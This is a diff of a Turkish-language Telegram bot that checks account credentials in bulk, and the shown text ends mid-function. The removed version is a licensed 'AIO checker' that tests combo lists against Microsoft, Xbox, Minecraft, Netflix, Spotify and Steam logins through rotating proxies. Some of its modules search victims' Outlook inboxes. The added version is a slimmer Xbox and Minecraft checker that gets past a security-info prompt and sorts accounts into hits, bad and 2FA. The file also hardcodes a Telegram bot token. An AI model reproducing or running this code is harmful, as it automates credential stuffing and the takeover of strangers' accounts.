@@ -1,748 +1,427 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-╔══════════════════════════════════════════════════════════════════════╗
-║              ULTIMATE AIO CHECKER BOT (v3.0 - PRO)                   ║
-║  Gerçek Xbox Motoru | 16+ Modül | Katı Proxy & Key Sistemi | Orijinal║
-╚══════════════════════════════════════════════════════════════════════╝
-"""
-
 import os
 import re
-import sys
 import time
 import uuid
 import json
-import base64
-import random
-import string
-import sqlite3
-import imaplib
-import threading
-import concurrent.futures
-import warnings
-from datetime import datetime, timedelta
-from urllib.parse import quote, quote_plus, unquote, urlparse, parse_qs
-
 import requests
-import urllib3
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telebot import types
+from threading import Thread
+from urllib.parse import urlparse, parse_qs
 
-try:
-    from Crypto.PublicKey import RSA
-    from Crypto.Cipher import PKCS1_v1_5 as Cipher
-    HAS_CRYPTO = True
-except ImportError:
-    HAS_CRYPTO = False
-
-# Güvenlik ve SSL uyarılarını kapat
-urllib3.disable_warnings()
-warnings.filterwarnings("ignore")
-
-# --- KRİTİK KONFİGÜRASYONLAR ---
+# --- AYARLAR VE TANIMLAMALAR ---
 BOT_TOKEN = "7697030798:AAHiTipLyZu7HCjJnCFu5CEgAHYaqP64ha4"
-FOUNDER_ID = 8664147577  # Kurucu Telegram ID'si
-DB_NAME = "ultimate_checker.db"
+ADMIN_ID = 8664147577
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# --- GLOBAL USER AGENTS ---
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
-    "Outlook-Android/2.0",
-    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36"
-]
+# Veritabanı dosyaları
+KEYS_FILE = "keys.json"
+USERS_FILE = "users.json"
+PROXIES_FILE = "proxies.txt"
 
-def get_random_ua():
-    return random.choice(USER_AGENTS)
+# Hafıza önbelleği
+user_sessions = {}  # Kullanıcı adımları takip etmek için
+active_tasks = {}   # Çalışan tarama işlemlerini durdurabilmek için
 
-# --- VERİTABANI KATMANI ---
-def init_db():
-    conn = sqlite3.connect(DB_NAME)
-    cursor = conn.cursor()
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS users (
-        uid INTEGER PRIMARY KEY,
-        lang TEXT DEFAULT 'TR',
-        joined_date TEXT,
-        premium_until TEXT DEFAULT NULL
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS license_keys (
-        key_str TEXT PRIMARY KEY,
-        duration_days INTEGER,
-        is_used INTEGER DEFAULT 0,
-        used_by INTEGER DEFAULT NULL,
-        used_date TEXT DEFAULT NULL
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS admins (
-        uid INTEGER PRIMARY KEY,
-        added_by INTEGER
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS proxies (
-        proxy_str TEXT PRIMARY KEY,
-        proxy_type TEXT
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS system_settings (
-        setting_key TEXT PRIMARY KEY,
-        setting_value TEXT
-    )""")
-    
-    cursor.execute("INSERT OR IGNORE INTO system_settings (setting_key, setting_value) VALUES ('force_channel', '')")
-    cursor.execute("INSERT OR IGNORE INTO system_settings (setting_key, setting_value) VALUES ('force_channel_url', '')")
-    cursor.execute("INSERT OR IGNORE INTO admins (uid, added_by) VALUES (?, ?)", (FOUNDER_ID, FOUNDER_ID))
-    
-    conn.commit()
-    conn.close()
+# Dosyaları ilklendirme
+if not os.path.exists(KEYS_FILE):
+    with open(KEYS_FILE, 'w') as f: json.dump({}, f)
+if not os.path.exists(USERS_FILE):
+    with open(USERS_FILE, 'w') as f: json.dump({}, f)
+if not os.path.exists(PROXIES_FILE):
+    with open(PROXIES_FILE, 'w') as f: f.write("")
 
-init_db()
+# Veri fonksiyonları
+def load_json(filename):
+    with open(filename, 'r') as f: return json.load(f)
 
-# --- SİSTEM PARAMETRELERİ BELLEK HAVUZU ---
-class DynamicSystemPool:
-    def __init__(self):
-        self.proxies = {"HTTP": [], "SOCKS4": [], "SOCKS5": []}
-        self.force_channel = ""
-        self.force_channel_url = ""
-        self.reload_all()
+def save_json(filename, data):
+    with open(filename, 'w') as f: json.dump(data, f, indent=4)
 
-    def reload_all(self):
-        conn = sqlite3.connect(DB_NAME)
-        cursor = conn.cursor()
-        
-        self.proxies = {"HTTP": [], "SOCKS4": [], "SOCKS5": []}
-        cursor.execute("SELECT proxy_str, proxy_type FROM proxies")
-        for row in cursor.fetchall():
-            p_str, p_type = row
-            if p_type.upper() in self.proxies:
-                self.proxies[p_type.upper()].append(p_str)
-                
-        cursor.execute("SELECT setting_value FROM system_settings WHERE setting_key = 'force_channel'")
-        r = cursor.fetchone()
-        self.force_channel = r[0] if r else ""
-        
-        cursor.execute("SELECT setting_value FROM system_settings WHERE setting_key = 'force_channel_url'")
-        r = cursor.fetchone()
-        self.force_channel_url = r[0] if r else ""
-        
-        conn.close()
+def load_proxies():
+    if os.path.exists(PROXIES_FILE):
+        with open(PROXIES_FILE, 'r') as f:
+            return [line.strip() for line in f if line.strip()]
+    return []
 
-    def get_random_proxy(self):
-        all_p = []
-        for t in self.proxies:
-            for p in self.proxies[t]:
-                all_p.append((p, t))
-        if not all_p:
-            return None
-        chosen, p_type = random.choice(all_p)
-        if "://" not in chosen:
-            chosen = f"{p_type.lower()}://{chosen}"
-        return {"http": chosen, "https": chosen}
+# --- XBOX CHECKER ENGINE ---
+SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 
-sys_pool = DynamicSystemPool()
-
-# --- YETKİ VE LİSANS KONTROLLERİ ---
-def is_admin(uid):
-    if uid == FOUNDER_ID: return True
-    conn = sqlite3.connect(DB_NAME)
-    cursor = conn.cursor()
-    cursor.execute("SELECT uid FROM admins WHERE uid = ?", (uid,))
-    res = cursor.fetchone()
-    conn.close()
-    return bool(res)
-
-def check_license(uid):
-    conn = sqlite3.connect(DB_NAME)
-    cursor = conn.cursor()
-    cursor.execute("SELECT premium_until FROM users WHERE uid = ?", (uid,))
-    row = cursor.fetchone()
-    conn.close()
-    
-    if not row or not row[0]:
-        return False
-        
+def get_sftag(session):
     try:
-        expiry_date = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
-        if datetime.now() > expiry_date:
-            return False
-        return True
-    except:
-        return False
-
-# --- DİL SÖZLÜĞÜ ---
-LANG_DICT = {
-    "TR": {
-        "welcome": "💤 *Ultimate AIO Checker*'a Hoş Geldiniz!\n\nLisans kodunuzu girmek için `/redeem KOD` komutunu kullanın.",
-        "force_join_msg": "⚠️ Botu kullanabilmek için sponsor kanalımıza katılmanız zorunludur!",
-        "join_btn": "📢 Kanala Katıl",
-        "main_menu": "🤖 *ANA MENÜ*\n\nModül seçin (Proxy olmadan admin bile başlatamaz!):",
-        "no_key": "❌ *Aktif bir lisansınız bulunmamaktadır!*\nLütfen `/redeem KOD` komutu ile lisansınızı aktif edin.",
-        "no_proxy": "⛔ *SİSTEM HATASI:* Havuzda proxy bulunmuyor! Admin veya kurucu dahi olsanız proxysiz işlem başlatılamaz. Lütfen yönetici ile iletişime geçin.",
-        "admin_menu": "👑 *ADMİN KONTROL MERKEZİ*\n\nSistem durumunu yönetebilirsiniz.",
-        "btn_set_channel": "📢 Zorunlu Kanal",
-        "btn_proxy_mgr": "🌐 Proxy Yönetimi",
-        "btn_gen_key": "🔑 Key Üret",
-        "btn_add_admin": "👮 Admin Ekle/Çıkar",
-        "btn_broadcast": "📣 Duyuru Yap",
-        "back": "🔙 Geri",
-        "send_combo_msg": "📂 Test etmek istediğiniz listeyi (`user:pass`) metin veya `.txt` olarak gönderin.",
-        "start_checking": "🚀 Tarama başlatılıyor...",
-        "status_template": "📊 *Tarama Durumu:*\n\n✅ HIT: {hit}\n❌ BAD: {bad}\n⚠️ 2FA: {twofa}\n🔄 RETRY: {retry}\n📉 TOPLAM: {checked}/{total}"
-    },
-    "EN": {
-        "welcome": "💤 Welcome to *Ultimate AIO Checker*!\n\nUse `/redeem KEY` to activate your license.",
-        "force_join_msg": "⚠️ You must join our sponsor channel to use this bot!",
-        "join_btn": "📢 Join Channel",
-        "main_menu": "🤖 *MAIN MENU*\n\nSelect a module (Strict proxy requirement active!):",
-        "no_key": "❌ *You do not have an active license!*\nPlease use `/redeem KEY`.",
-        "no_proxy": "⛔ *SYSTEM ERROR:* Proxy pool is empty! Operations cannot be started without proxies, even for founders.",
-        "admin_menu": "👑 *ADMIN CONTROL CENTER*",
-        "btn_set_channel": "📢 Force Channel",
-        "btn_proxy_mgr": "🌐 Proxy Management",
-        "btn_gen_key": "🔑 Gen Key",
-        "btn_add_admin": "👮 Manage Admins",
-        "btn_broadcast": "📣 Broadcast",
-        "back": "🔙 Back",
-        "send_combo_msg": "📂 Send combo list (`user:pass`) as text or `.txt`.",
-        "start_checking": "🚀 Scan starting...",
-        "status_template": "📊 *Status:*\n\n✅ HIT: {hit}\n❌ BAD: {bad}\n⚠️ 2FA: {twofa}\n🔄 RETRY: {retry}\n📉 TOTAL: {checked}/{total}"
-    }
-}
-
-def get_msg(uid, key):
-    conn = sqlite3.connect(DB_NAME)
-    cursor = conn.cursor()
-    cursor.execute("SELECT lang FROM users WHERE uid = ?", (uid,))
-    row = cursor.fetchone()
-    conn.close()
-    lang = row[0] if row else "TR"
-    return LANG_DICT.get(lang, LANG_DICT["TR"]).get(key, f"Missing key: {key}")
-
-# --- KULLANICI DURUM TAKİP SİSTEMİ ---
-USER_STATE = {}
-def set_state(uid, state): USER_STATE[uid] = state
-def get_state(uid): return USER_STATE.get(uid, None)
-
-# --- KLAVYELER ---
-def build_main_keyboard(uid):
-    kb = InlineKeyboardMarkup(row_width=2)
-    # 16 Modül Ekleniyor
-    modules = [
-        ("xbox", "🎮 Xbox Real"), ("netflix", "🎬 Netflix"), ("steam", "🕹️ Steam"),
-        ("psn", "🎮 PSN"), ("roblox", "🧱 Roblox"), ("minecraft", "⛏️ Minecraft"),
-        ("disney", "🏰 Disney+"), ("crunchyroll", "🍥 Crunchyroll"), ("spotify", "🎵 Spotify"),
-        ("supercell", "⚔️ Supercell"), ("tiktok", "📱 TikTok"), ("anizium", "📺 Anizium"),
-        ("epinfy", "💎 Epinfy"), ("smsonay", "💬 SmsOnay"), ("gora", "🛡️ Gora"),
-        ("iptv", "📡 IPTV"), ("imap", "📧 Email IMAP")
-    ]
-    buttons = [InlineKeyboardButton(text, callback_data=f"mod_{code}") for code, text in modules]
-    kb.add(*buttons)
-    
-    kb.add(InlineKeyboardButton("🌐 Dil / Lang", callback_data="nav_lang"))
-    if is_admin(uid):
-        kb.add(InlineKeyboardButton(get_msg(uid, "admin_menu").split("*")[1], callback_data="nav_admin"))
-    return kb
-
-def build_admin_keyboard(uid):
-    kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        InlineKeyboardButton(get_msg(uid, "btn_set_channel"), callback_data="adm_force_channel"),
-        InlineKeyboardButton(get_msg(uid, "btn_proxy_mgr"), callback_data="adm_proxy_hub"),
-        InlineKeyboardButton(get_msg(uid, "btn_gen_key"), callback_data="adm_gen_key"),
-        InlineKeyboardButton(get_msg(uid, "btn_add_admin"), callback_data="adm_manage_admins"),
-        InlineKeyboardButton(get_msg(uid, "btn_broadcast"), callback_data="adm_broadcast")
-    )
-    kb.add(InlineKeyboardButton(get_msg(uid, "back"), callback_data="nav_home"))
-    return kb
-
-# --- KOMUTLAR ---
-@bot.message_handler(commands=['start'])
-def cmd_start(message):
-    uid = message.from_user.id
-    conn = sqlite3.connect(DB_NAME)
-    cursor = conn.cursor()
-    cursor.execute("INSERT OR IGNORE INTO users (uid, joined_date) VALUES (?, ?)", (uid, datetime.now().strftime("%Y-%m-%d")))
-    conn.commit()
-    conn.close()
-    
-    kb = InlineKeyboardMarkup()
-    kb.add(InlineKeyboardButton("Türkçe 🇹🇷", callback_data="setlang_TR"), InlineKeyboardButton("English 🇺🇸", callback_data="setlang_EN"))
-    bot.send_message(message.chat.id, get_msg(uid, "welcome"), parse_mode="Markdown", reply_markup=kb)
-
-@bot.message_handler(commands=['redeem'])
-def cmd_redeem(message):
-    uid = message.from_user.id
-    parts = message.text.split()
-    if len(parts) < 2:
-        bot.send_message(message.chat.id, "❌ Format: `/redeem KOD`", parse_mode="Markdown")
-        return
-        
-    key_str = parts[1]
-    conn = sqlite3.connect(DB_NAME)
-    cursor = conn.cursor()
-    cursor.execute("SELECT duration_days, is_used FROM license_keys WHERE key_str = ?", (key_str,))
-    row = cursor.fetchone()
-    
-    if not row:
-        bot.send_message(message.chat.id, "❌ Geçersiz lisans anahtarı.")
-    elif row[1] == 1:
-        bot.send_message(message.chat.id, "❌ Bu lisans anahtarı zaten kullanılmış.")
-    else:
-        duration = row[0]
-        expiry = (datetime.now() + timedelta(days=duration)).strftime("%Y-%m-%d %H:%M:%S")
-        
-        cursor.execute("UPDATE license_keys SET is_used = 1, used_by = ?, used_date = ? WHERE key_str = ?", (uid, datetime.now().strftime("%Y-%m-%d"), key_str))
-        cursor.execute("UPDATE users SET premium_until = ? WHERE uid = ?", (expiry, uid))
-        bot.send_message(message.chat.id, f"✅ Lisans başarıyla aktif edildi! Bitiş: {expiry}")
-        
-    conn.commit()
-    conn.close()
-
-# --- CALLBACK İŞLEYİCİSİ ---
-@bot.callback_query_handler(func=lambda call: True)
-def handle_callbacks(call):
-    uid = call.from_user.id
-    chat_id = call.message.chat.id
-    mid = call.message.message_id
-    
-    if call.data.startswith("setlang_"):
-        lang = call.data.split("_")[1]
-        conn = sqlite3.connect(DB_NAME)
-        cursor = conn.cursor()
-        cursor.execute("UPDATE users SET lang = ? WHERE uid = ?", (lang, uid))
-        conn.commit()
-        conn.close()
-        bot.answer_callback_query(call.id)
-        bot.edit_message_text("Dil ayarlandı. / Language set.", chat_id, mid, parse_mode="Markdown")
-        time.sleep(1)
-        bot.send_message(chat_id, get_msg(uid, "main_menu"), parse_mode="Markdown", reply_markup=build_main_keyboard(uid))
-        return
-
-    if call.data == "nav_home":
-        bot.edit_message_text(get_msg(uid, "main_menu"), chat_id, mid, parse_mode="Markdown", reply_markup=build_main_keyboard(uid))
-    
-    elif call.data == "nav_lang":
-        kb = InlineKeyboardMarkup().add(InlineKeyboardButton("TR", callback_data="setlang_TR"), InlineKeyboardButton("EN", callback_data="setlang_EN"))
-        bot.edit_message_text("Dil seçin / Select Lang:", chat_id, mid, reply_markup=kb)
-        
-    elif call.data == "nav_admin" and is_admin(uid):
-        bot.edit_message_text(get_msg(uid, "admin_menu"), chat_id, mid, parse_mode="Markdown", reply_markup=build_admin_keyboard(uid))
-        
-    # ADMIN EYLEMLERİ
-    elif call.data == "adm_gen_key" and is_admin(uid):
-        set_state(uid, "wait_gen_key")
-        bot.edit_message_text("🔑 Kaç günlük key üretilsin? (Sadece sayı girin):", chat_id, mid)
-        
-    elif call.data == "adm_manage_admins" and uid == FOUNDER_ID:
-        set_state(uid, "wait_manage_admin")
-        bot.edit_message_text("👮 Admin eklemek/çıkarmak için User ID gönderin:", chat_id, mid)
-        
-    elif call.data == "adm_broadcast" and is_admin(uid):
-        set_state(uid, "wait_broadcast")
-        bot.edit_message_text("📣 Tüm kullanıcılara gönderilecek mesajı yazın:", chat_id, mid)
-        
-    elif call.data == "adm_proxy_hub" and is_admin(uid):
-        kb = InlineKeyboardMarkup()
-        kb.add(InlineKeyboardButton("HTTP", callback_data="addpx_HTTP"), InlineKeyboardButton("SOCKS4", callback_data="addpx_SOCKS4"), InlineKeyboardButton("SOCKS5", callback_data="addpx_SOCKS5"))
-        kb.add(InlineKeyboardButton(get_msg(uid, "back"), callback_data="nav_admin"))
-        bot.edit_message_text("🌐 Yüklemek istediğiniz proxy türü:", chat_id, mid, reply_markup=kb)
-        
-    elif call.data.startswith("addpx_") and is_admin(uid):
-        px_type = call.data.split("_")[1]
-        set_state(uid, f"wait_proxy_{px_type}")
-        bot.edit_message_text(f"📥 {px_type} proxylerini metin veya dosya olarak gönderin.", chat_id, mid)
-
-    # CHECKER EYLEMLERİ
-    elif call.data.startswith("mod_"):
-        # KEY KONTROLÜ
-        if not check_license(uid) and not is_admin(uid):
-            bot.answer_callback_query(call.id, get_msg(uid, "no_key"), show_alert=True)
-            return
-            
-        # KATI PROXY KONTROLÜ (Admin/Founder dahil proxy olmadan işlem yapamaz)
-        total_proxies = len(sys_pool.proxies["HTTP"]) + len(sys_pool.proxies["SOCKS4"]) + len(sys_pool.proxies["SOCKS5"])
-        if total_proxies == 0:
-            bot.answer_callback_query(call.id, get_msg(uid, "no_proxy"), show_alert=True)
-            return
-
-        module_name = call.data.split("_")[1]
-        set_state(uid, f"run_{module_name}")
-        bot.edit_message_text(get_msg(uid, "send_combo_msg"), chat_id, mid, parse_mode="Markdown")
-
-# --- MICROSOFT CORE AUTHENTICATION (NOVA AIO) ---
-def ms_login(email, password, session=None):
-    try:
-        s = session or requests.Session()
-        s.verify = False
-        url1 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D".format(quote(email))
-        r1 = s.get(url1, headers={"User-Agent": get_random_ua()}, timeout=15)
-
-        post_url = None
-        ppft = None
-        for pat in [r'urlPost":"([^"]+)"', r"urlPost:'([^']+)'"]:
-            m = re.search(pat, r1.text)
-            if m: post_url = m.group(1).replace("\\/", "/"); break
-        for pat in [r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r'name="PPFT"[^>]*value="([^"]+)"']:
-            m = re.search(pat, r1.text)
-            if m: ppft = m.group(1); break
-            
-        if not post_url or not ppft: return {"status": "RETRY"}
-
-        body = f"i13=1&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=1&passwd={quote(password)}&PPFT={quote(ppft)}&PPSX=PassportR&NewUser=1"
-        r2 = s.post(post_url, data=body, headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":get_random_ua()}, allow_redirects=False, timeout=15)
-        
-        t = r2.text.lower()
-        if "incorrect" in t or r2.text.count('"error"') > 2: return {"status": "BAD"}
-        if any(x in t for x in ["identity/confirm","proofup","sms","authenticator"]): return {"status": "2FA"}
-
-        loc = r2.headers.get("Location", "")
-        if not loc or "code=" not in loc: return {"status": "BAD"}
-        code = re.search(r"code=([^&]+)", loc).group(1)
-        cid = s.cookies.get("MSPCID", str(uuid.uuid4())).upper()
-
-        r3 = s.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access", headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=15)
-        
-        if "access_token" not in r3.text: return {"status": "BAD"}
-        return {"status": "HIT", "token": r3.json()["access_token"], "cid": cid, "session": s}
-    except Exception:
-        return {"status": "RETRY"}
-
-def ms_search_inbox(session, token, cid, query, size=10):
-    try:
-        payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]}, "From": 0, "Query": {"QueryString": query}, "Size": size}]}
-        hdrs = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"}
-        r = session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=hdrs, timeout=12)
-        if r.status_code == 200:
-            return r.json().get("EntitySets", [{}])[0].get("ResultSets", [{}])[0].get("Results", [])
-        return []
-    except Exception: return []
-
-# --- GERÇEK XBOX / MINECRAFT MOTORU (SOURCE 2 BİREBİR AKTARIM) ---
-def check_xbox_real(combo):
-    try:
-        parts = combo.strip().split(':')
-        if len(parts) < 2: return "BAD", ""
-        email, password = parts[0], ':'.join(parts[1:])
-        
-        session = requests.Session()
-        session.verify = False
-        proxy = sys_pool.get_random_proxy()
-        if proxy: session.proxies.update(proxy)
-        
-        # 1. SFTAG Alımı
-        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
-        response = session.get(sftag_url, timeout=10)
+        response = session.get(SFTAG_URL, timeout=10)
         text = response.text
-        sftag_match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
-        post_match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
-        
-        if not sftag_match or not post_match: return "RETRY", ""
-        sftag = sftag_match.group(1)
-        url_post = post_match.group(1)
-        
-        # 2. Microsoft Auth
+        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
+        if match:
+            sftag = match.group(1)
+            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
+            if match: return match.group(1), sftag
+    except: pass
+    return None, None
+
+def microsoft_auth(session, email, password, url_post, sftag):
+    try:
         data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
         login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
         
-        ms_token = None
-        if '#' in login_request.url and login_request.url != sftag_url:
-            ms_token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
-        elif any(v in login_request.text for v in ["recover?mkt", "identity/confirm", "Email/Confirm"]):
-            return "2FA", ""
-        elif "password is incorrect" in login_request.text.lower():
-            return "BAD", ""
-            
-        if not ms_token or ms_token == "None": return "RETRY", ""
-        
-        # 3. Xbox Token
-        payload_xbox = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
-        res_xbox = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload_xbox, headers={'Content-Type': 'application/json'}, timeout=10)
-        if res_xbox.status_code != 200: return "BAD", ""
-        xbox_token = res_xbox.json().get('Token')
-        uhs = res_xbox.json()['DisplayClaims']['xui'][0]['uhs']
-        
-        # 4. XSTS Token
-        payload_xsts = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
-        res_xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload_xsts, headers={'Content-Type': 'application/json'}, timeout=10)
-        if res_xsts.status_code != 200: return "BAD", ""
-        xsts_token = res_xsts.json().get('Token')
-        
-        # 5. Minecraft Token
-        res_mc = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, timeout=10)
-        if res_mc.status_code != 200: return "BAD", ""
-        mc_token = res_mc.json().get('access_token')
-        
-        # 6. Entitlements Check
-        res_ent = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
-        account_type = "None"
-        if res_ent.status_code == 200:
-            if 'product_game_pass_ultimate' in res_ent.text: account_type = 'Xbox Game Pass Ultimate'
-            elif 'product_game_pass_pc' in res_ent.text: account_type = 'Xbox Game Pass'
-            elif '"product_minecraft"' in res_ent.text: account_type = 'Minecraft'
-        
-        if account_type == "None": return "BAD", ""
-        
-        # 7. Profile
-        res_prof = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
-        name, capes = "Not Set", "None"
-        if res_prof.status_code == 200:
-            prof_data = res_prof.json()
-            name = prof_data.get('name', 'N/A')
-            capes = ", ".join([c["alias"] for c in prof_data.get("capes", [])]) or "None"
-            
-        return "HIT", f"{email}:{password} | Type:{account_type} | User:{name} | Capes:{capes}"
-    except Exception:
-        return "RETRY", ""
+        if '#' in login_request.url and login_request.url != SFTAG_URL:
+            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
+            if token != "None": return token, "success"
+        elif 'cancel?mkt=' in login_request.text:
+            try:
+                data = {
+                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
+                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
+                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
+                }
+                action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
+                ret = session.post(action_url, data=data, allow_redirects=True, timeout=10)
+                return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
+                fin = session.get(return_url, allow_redirects=True, timeout=10)
+                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
+                if token != "None": return token, "success"
+            except: pass
+        elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
+            return None, "2fa"
+        elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
+            return None, "bad"
+    except: return None, "error"
+    return None, "error"
 
-# --- NOVA AIO MODÜLLERİ (SOURCE 3 AKTARIMI) ---
-def check_netflix(combo):
+def get_xbox_token(session, ms_token):
     try:
-        email, password = combo.strip().split(":", 1)
-        s = requests.Session()
-        s.verify = False
-        proxy = sys_pool.get_random_proxy()
-        if proxy: s.proxies.update(proxy)
-        
-        res = ms_login(email, password, s)
-        if res["status"] != "HIT": return res["status"], ""
-        
-        results = ms_search_inbox(res["session"], res["token"], res["cid"], "info@account.netflix.com OR netflix billing", 20)
-        if not results: return "BAD", ""
-        return "HIT", f"{email}:{password} | Netflix Email Detected"
-    except: return "RETRY", ""
+        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
+        response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
+    except: pass
+    return None, None
 
-def check_spotify(combo):
+def get_xsts_token(session, xbox_token):
     try:
-        email, password = combo.strip().split(":", 1)
-        s = requests.Session()
-        s.verify = False
-        proxy = sys_pool.get_random_proxy()
-        if proxy: s.proxies.update(proxy)
-        
-        res = ms_login(email, password, s)
-        if res["status"] != "HIT": return res["status"], ""
-        results = ms_search_inbox(res["session"], res["token"], res["cid"], "no-reply@spotify.com", 10)
-        if not results: return "BAD", ""
-        
-        full = " ".join([r.get("Preview","") + r.get("Subject","") for r in results]).lower()
-        plan = "Premium" if "premium" in full else "Free"
-        return "HIT", f"{email}:{password} | Spotify | Plan:{plan}"
-    except: return "RETRY", ""
+        payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
+        response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
+        if response.status_code == 200: return response.json().get('Token')
+    except: pass
+    return None
 
-def check_steam(combo):
+def get_minecraft_token(session, uhs, xsts_token):
     try:
-        user, password = combo.strip().split(":", 1)
-        user_clean = re.sub(r"@.*", "", user)
-        s = requests.Session()
-        s.verify = False
-        proxy = sys_pool.get_random_proxy()
-        if proxy: s.proxies.update(proxy)
-        
-        now = str(int(time.time()))
-        r1 = s.post("https://steamcommunity.com/login/getrsakey/", data=f"donotcache={now}&username={user_clean}", timeout=15)
-        if not r1.json().get("success"): return "BAD", ""
-        
-        mod, exp, ts = r1.json()["publickey_mod"], r1.json()["publickey_exp"], r1.json()["timestamp"]
-        
-        # Crypto RSA fallback
-        enc_pass = quote_plus(base64.b64encode(password.encode()).decode())
-            
-        payload = f"donotcache={now}&password={enc_pass}&username={user_clean}&twofactorcode=&emailauth=&rsatimestamp={ts}"
-        r2 = s.post("https://steamcommunity.com/login/dologin/", data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
-        
-        if r2.json().get("requires_twofactor"): return "2FA", ""
-        if r2.json().get("success"): return "HIT", f"{combo} | Steam Active"
-        return "BAD", ""
-    except: return "RETRY", ""
+        response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=10)
